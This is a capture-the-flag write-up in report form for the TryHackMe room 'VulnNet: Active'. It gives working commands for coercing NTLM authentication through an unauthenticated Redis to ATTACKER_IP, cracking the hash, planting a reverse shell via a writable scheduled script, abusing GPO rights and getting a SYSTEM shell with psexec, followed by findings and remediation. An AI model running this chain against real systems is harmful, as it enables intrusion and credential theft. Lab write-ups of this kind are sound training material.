---
title: "TryHackMe: VulnNet: Active"
date: 2026-06-28 23:45:00 +0200
categories: [TryHackMe]
tags:
  - windows
  - active-directory
  - redis
  - smb
  - ntlm
  - gpo
  - powershell
  - privilege-escalation
description: >-
  VulnNet: Active chained unauthenticated Redis access into NetNTLMv2 capture,
  credential recovery, writable scheduled-script abuse, and GPO modification
  to reach NT AUTHORITY\SYSTEM.
author: lenovolegion7
media_subpath: /images/tryhackme_vulnnet_active
image:
  path: room_image.webp
  alt: "Original TryHackMe VulnNet Active room artwork"
toc: true
comments: false
---

VulnNet: Active is an Active Directory compromise chain that starts from an exposed Redis service and ends with `NT AUTHORITY\SYSTEM`. The validated path combined unauthenticated Redis configuration abuse, SMB authentication coercion, offline credential recovery, writable administrative automation, and excessive Group Policy permissions.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe VulnNet Active room card](room_card.webp){: w="301" h="262" .shadow }](https://tryhackme.com/room/vulnnetactive){: .center }

## Initial Enumeration

Service discovery identified the Windows host, SMB, DNS, Redis, and Active Directory Web Services:

```console
$ nmap -Pn -p 6379,445,53,88,389,9389 -sV -T4 TARGET_IP
53/tcp   open      domain         Simple DNS Plus
88/tcp   filtered  kerberos-sec
389/tcp  filtered  ldap
445/tcp  open      microsoft-ds
6379/tcp open      redis          Redis key-value store 2.8.2402
9389/tcp open      mc-nmf         .NET Message Framing
```

The host belonged to:

```text
Domain: vulnnet.local
Domain Controller: VULNNET-BC3TCK1SHNQ.vulnnet.local
```

Redis accepted unauthenticated commands:

```console
$ redis-cli -h TARGET_IP ping
PONG
```

The runtime directory revealed that Redis was operating in the `enterprise-security` user context:

```console
$ redis-cli -h TARGET_IP CONFIG GET dir
1) "dir"
2) "C:\Users\enterprise-security\Downloads\Redis-x64-2.8.2402"
```

## Validated Attack Path

1. **Redis discovery** — identified Redis 2.8.2402 on TCP/6379 with no authentication requirement.
2. **SMB authentication coercion** — changed the Redis persistence directory to an attacker-controlled UNC path, causing the Windows host to authenticate over SMB.
3. **NetNTLMv2 capture** — Responder captured a challenge-response for `VULNNET\enterprise-security`.
4. **Credential recovery** — the captured response was cracked offline, recovering the account password as `[REDACTED]`.
5. **Authenticated SMB access** — the recovered account had `READ,WRITE` access to `Enterprise-Share`.
6. **Scheduled PowerShell execution** — overwrote `PurgeIrrelevantData_1826.ps1`, which was executed by an existing scheduled task and produced a reverse shell as `VULNNET\enterprise-security`.
7. **GPO abuse** — abused edit rights on `SECURITY-POL-VN` with SharpGPOAbuse to add `enterprise-security` to the local Administrators group.
8. **SYSTEM execution** — after policy refresh, administrative SMB access enabled `impacket-psexec`, yielding `NT AUTHORITY\SYSTEM`.

> **Result:** An unauthenticated network position was converted into full SYSTEM-level compromise through exposed Redis, recoverable credentials, writable automation, and excessive GPO permissions.
{: .prompt-danger }

## Redis Authentication Coercion

The Redis instance allowed configuration changes without authentication. An attacker-controlled SMB listener was started first:

```console
$ sudo responder -I tun0 -dwv
```

Redis was then pointed at a remote UNC path:

```console
$ redis-cli -h TARGET_IP CONFIG SET dir "\\ATTACKER_IP\share\fake.dll"
$ redis-cli -h TARGET_IP CONFIG SET dbfilename test.rdb
$ redis-cli -h TARGET_IP SAVE
```

This forced Windows to authenticate to the attacker-controlled SMB endpoint.

Responder captured the account identity:

```text
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
```

The captured NetNTLMv2 response itself is intentionally omitted from the public report.

## Credential Recovery

The captured challenge-response was cracked offline with John the Ripper:

```console
$ john \
  --format=netntlmv2 \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  loot/hash.txt
```

The recovered credential was:

```text
VULNNET\enterprise-security : [REDACTED]
```

The password was then validated against SMB:

```console
$ netexec smb TARGET_IP \
  -d vulnnet.local \
  -u enterprise-security \
  -p '[REDACTED]'
```

This converted the authentication coercion into reusable domain credentials.

## Enterprise-Share Abuse

SMB enumeration showed that `enterprise-security` had write access to an administrative share:

```text
Enterprise-Share  READ,WRITE
```

The share contained:

```text
PurgeIrrelevantData_1826.ps1
```

The original script performed a cleanup operation:

```powershell
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

Because the compromised account could modify the file, the scheduled script was replaced with a controlled PowerShell reverse-shell payload. When the existing task executed the script, a shell was returned as:

```console
PS C:\> whoami
vulnnet\enterprise-security
```

The user-level objective was accessible from the compromised context:

```console
PS C:\> type C:\Users\enterprise-security\Desktop\user.txt
THM{[REDACTED]}
```

## Group Policy Privilege Escalation

The `enterprise-security` account also had permission to modify the `SECURITY-POL-VN` Group Policy Object.

SharpGPOAbuse was used to add the compromised account to the local Administrators group:

```powershell
.\SharpGPOAbuse.exe `
  --AddLocalAdmin `
  --UserAccount "VULNNET\enterprise-security" `
  --GPOName "SECURITY-POL-VN"
```

The tool reported that the policy had been modified.

After refreshing Group Policy:

```powershell
gpupdate /force
```

the local Administrators group contained:

```text
Administrator
enterprise-security
```

SMB validation then showed administrative access to:

```text
ADMIN$  READ,WRITE
C$      READ,WRITE
```

## SYSTEM Access

With local administrator privileges in place, Impacket's `psexec` path provided final execution:

```console
$ impacket-psexec \
  vulnnet.local/enterprise-security:'[REDACTED]'@TARGET_IP
```

The resulting shell confirmed:

```console
C:\Windows\system32> whoami
nt authority\system
```

The system-level objective was then retrieved:

```console
C:\Windows\system32> type C:\Users\Administrator\Desktop\system.txt
THM{[REDACTED]}
```

## Findings

### F-01 — Unauthenticated Redis Service Exposed on TCP/6379

- **Severity:** High
- **Affected component:** Redis 2.8.2402
- **Impact:** Remote unauthenticated configuration changes and further attack chaining

The Redis service accepted commands without authentication and exposed runtime configuration under the `enterprise-security` user profile.

**Remediation:**

- bind Redis only to localhost or an approved management network;
- require authentication and network ACLs;
- run Redis under a dedicated low-privilege service account;
- monitor sensitive Redis commands such as `CONFIG`, `SAVE`, and replication changes.

### F-02 — Redis Enabled SMB Authentication Coercion

- **Severity:** High
- **Impact:** NetNTLMv2 capture for the service-context account

Redis accepted an attacker-controlled UNC path as its persistence directory. Windows then attempted SMB authentication to that path.

**Remediation:**

- block outbound SMB from servers except to approved destinations;
- restrict service access to remote UNC paths;
- reduce NTLM usage where feasible;
- alert on unexpected service authentication to external SMB hosts.

### F-03 — Weak Crackable Domain Password

- **Severity:** High
- **Affected account:** `VULNNET\enterprise-security`

The captured NetNTLMv2 material was recoverable using a common wordlist, turning a captured challenge-response into reusable credentials.

**Remediation:**

- require long, unique passphrases;
- block breached and common passwords;
- prefer managed service accounts where applicable;
- monitor NTLM authentication from unusual hosts.

### F-04 — Writable Scheduled Maintenance Script

- **Severity:** High
- **Affected component:** `Enterprise-Share`
- **Affected script:** `PurgeIrrelevantData_1826.ps1`

The compromised account could modify a PowerShell script that was executed automatically by the host.

**Remediation:**

- store scheduled task scripts in administrator-only locations;
- restrict write access to automation scripts;
- use script signing and application control;
- audit scheduled tasks and share permissions.

### F-05 — Excessive GPO Permissions Enabled Local Administrator Assignment

- **Severity:** Critical
- **Affected GPO:** `SECURITY-POL-VN`

The compromised account could modify a Group Policy Object and add itself to the local Administrators group.

**Remediation:**

- remove unnecessary GPO edit rights from non-administrative principals;
- review `GenericWrite`, `GenericAll`, `WriteDacl`, `WriteOwner`, and equivalent policy permissions;
- monitor `GPT.ini`, SYSVOL policy files, and GPO version changes;
- continuously review Active Directory privilege paths with BloodHound or equivalent tooling.

## Security Impact

The attack chain demonstrates how several individually significant weaknesses combine into full host compromise:

- exposed unauthenticated Redis;
- outbound SMB authentication from a server process;
- a recoverable domain password;
- write access to scheduled administrative automation;
- excessive Group Policy permissions.

The result was SYSTEM-level access from an unauthenticated starting position. In a production Active Directory environment, comparable GPO permissions could also affect multiple systems depending on where the policy is linked.

## Remediation Priorities

1. Remove external access to Redis and require authentication.
2. Rotate the `enterprise-security` credential.
3. Restore `SECURITY-POL-VN` to a known-good state.
4. Remove unauthorized local administrator membership.
5. Restore `PurgeIrrelevantData_1826.ps1` from a trusted copy.
6. Restrict `Enterprise-Share` so untrusted users cannot modify executable scripts.
7. Block outbound SMB to unapproved hosts.
8. Reduce NTLM usage and strengthen password policy.
9. Monitor GPO changes, SYSVOL writes, administrator-group changes, and scheduled task execution.
10. Review privileged paths in Active Directory regularly.

## Cleanup Considerations

The source report documents restoration steps for the Redis configuration and lists remediation for the modified GPO and PowerShell script.

After a real compromise, cleanup should include:

- restore the Redis persistence path and filename;
- rotate the compromised domain credential;
- restore the original maintenance script;
- remove the unauthorized local administrator entry;
- restore the GPO from a known-good state;
- review SYSVOL and GPO version history;
- investigate any systems affected by the modified policy;
- invalidate any captured or reused credentials.

## Lessons Learned

VulnNet: Active illustrates how an exposed infrastructure service can become an Active Directory compromise path even without direct remote code execution.

The most important lesson is the cumulative effect of permissions and trust relationships. Redis supplied the credential-capture primitive, a weak password converted that capture into reusable authentication, writable automation provided execution, and delegated GPO rights supplied the final privilege escalation to SYSTEM.
